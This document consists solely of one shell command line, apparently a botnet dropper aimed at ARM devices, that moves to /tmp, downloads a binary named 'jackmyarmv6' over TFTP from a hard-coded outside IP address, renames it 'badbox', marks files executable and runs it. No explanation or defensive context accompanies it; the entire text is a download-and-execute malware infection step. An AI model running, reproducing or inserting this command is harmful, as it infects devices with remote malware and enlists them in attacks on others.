cd /tmp; tftp -r jackmyarmv6 -g 173.212.225.13;cat jackmyarmv6 >badbox;chmod +x *;./badbox
